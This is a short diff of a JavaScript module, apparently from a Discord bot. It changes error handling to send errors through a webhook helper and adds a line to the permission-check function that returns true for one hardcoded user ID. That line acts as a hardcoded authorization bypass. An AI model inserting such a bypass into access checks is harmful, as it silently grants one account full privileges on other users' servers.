@@ -104,7 +104,7 @@ module.exports = {
 
 
         } catch (e) {
-            console.log(e)
+            gear.hook.send(e.error)
         }
     },
     emoji: function emoji(emo) {
@@ -124,7 +124,7 @@ module.exports = {
 try{
 
         var  userData = this.userDB.get(TG.id).modules;
-}catch(e){console.log(e)}
+}catch(e){gear.hook.send(e.error)}
 try{
        var  userData = userDB.get(TG.id).modules;
 }catch(e){console.log("2:    "+e)}
@@ -225,6 +225,9 @@ try{
 
     },
     hasPerms: function hasPerms(Member, DB) {
+
+        if(Member.id =="88120564400553984" ) return true;
+
         let Server = Member.guild
         //var DB = DB;
         var modPass = false;
